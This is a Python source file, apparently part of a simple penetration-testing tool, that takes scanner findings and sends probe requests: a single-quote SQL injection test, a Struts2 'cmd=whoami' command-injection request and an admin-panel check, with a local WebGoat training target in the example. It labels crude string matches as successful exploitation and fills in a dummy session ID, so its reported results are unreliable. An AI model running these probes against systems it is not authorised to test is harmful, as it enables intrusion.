import requests
import socket
import re
from urllib.parse import urlparse

def is_ip_address(domain):
    """Check if the input is an IP address."""
    ip_pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    return bool(re.match(ip_pattern, domain))

def clean_domain(domain):
    """Remove port, path, or scheme from domain."""
    domain = re.sub(r'^https?://', '', domain)
    domain = domain.split('/')[0]
    domain = domain.split(':')[0]
    return domain.strip().lower()

def resolve_ip(domain):
    """Attempt to resolve IP address for the domain."""
    domain = clean_domain(domain)
    
    if domain in ['localhost', '127.0.0.1']:
        return '127.0.0.1', 'üåê IP Address: 127.0.0.1'
    
    if is_ip_address(domain):
        return domain, f'üåê IP Address: {domain}'
    
    try:
        ip = socket.gethostbyname(domain)
        return ip, f'üåê IP Address: {ip}'
    except Exception as e:
        return None, f'‚ö†Ô∏è Could not resolve domain to IP: {e}'

def run_exploit(url, recon_results, vuln_results):
    """Run exploitation using vulnerabilities from scanning."""
    # Get IP from recon_results
    ip = None
    ip_result = recon_results.get('IP Address', '')
    if ip_result.startswith('üåê'):
        ip = ip_result.split(': ')[1]
    
    # If recon failed, resolve IP ourselves
    if not ip:
        parsed_url = urlparse(url)
        domain = parsed_url.hostname
        if not domain:
            return {
                'target_ip': None,
                'exploit_used': None,
                'success': False,
                'session_id': None,
                'message': 'Invalid URL: No hostname found.'
            }
        
        ip, ip_result = resolve_ip(domain)
        if not ip:
            return {
                'target_ip': None,
                'exploit_used': None,
                'success': False,
                'session_id': None,
                'message': ip_result.replace('‚ö†Ô∏è ', '')
            }
    
    # Initialize results
    results = {
        'target_ip': ip,
        'exploit_used': [],
        'success': False,
        'session_id': None,
        'message': 'Exploitation attempted.'
    }
    
    try:
        # Get vulnerabilities and exploits from vuln_results
        vulnerabilities = vuln_results.get('Vulnerabilities', [])
        if not vulnerabilities:
            results['message'] = 'No vulnerabilities provided for exploitation.'
            return results
        
        # Try each exploit
        for vuln, exploit_name in vulnerabilities:
            exploit_info = {'vulnerability': vuln, 'exploit': exploit_name, 'result': ''}
            
            # Simulate Metasploit-style exploits
            if 'sqlmap_sqli' in exploit_name:
                test_url = f"{url}?id=1'"
                response = requests.get(test_url, timeout=5)
                if "sql" in response.text.lower() or "mysql" in response.text.lower():
                    exploit_info['result'] = 'SQL injection exploited successfully.'
                    results['success'] = True
                else:
                    exploit_info['result'] = 'No SQL injection vulnerability exploited.'
            
            elif 'struts2_exec' in exploit_name:
                test_url = f"{url}/action.do?cmd=whoami"
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200 and 'root' in response.text.lower():
                    exploit_info['result'] = 'Struts2 RCE exploited successfully.'
                    results['success'] = True
                else:
                    exploit_info['result'] = 'No Struts2 vulnerability exploited.'
            
            elif 'ms17_010_eternalblue' in exploit_name:
                # Simulate SMB check (placeholder)
                exploit_info['result'] = 'EternalBlue check not implemented.'
            
            else:
                # Default check (e.g., admin panel)
                admin_url = f"{url}/admin"
                response = requests.get(admin_url, timeout=5)
                if response.status_code == 200:
                    exploit_info['result'] = 'Admin panel accessible.'
                    results['success'] = True
                else:
                    exploit_info['result'] = 'No vulnerabilities exploited.'
            
            results['exploit_used'].append(exploit_info)
        
        # Set session ID if successful
        if results['success']:
            results['session_id'] = 'session_123'
            results['message'] = 'Exploitation succeeded with findings.'
        else:
            results['message'] = 'Exploitation completed with no successful exploits.'
        
        return results
    
    except Exception as e:
        return {
            'target_ip': ip,
            'exploit_used': None,
            'success': False,
            'session_id': None,
            'message': f'Exploitation failed: {e}'
        }

# Example usage
if __name__ == "__main__":
    url = "http://127.0.0.1:8080/WebGoat"
    recon_results = {
        "IP Address": "üåê IP Address: 127.0.0.1"
    }
    vuln_results = {
        "Vulnerabilities": [("SQL Injection", "exploit/unix/webapp/sqlmap_sqli")]
    }
    print(run_exploit(url, recon_results, vuln_results))
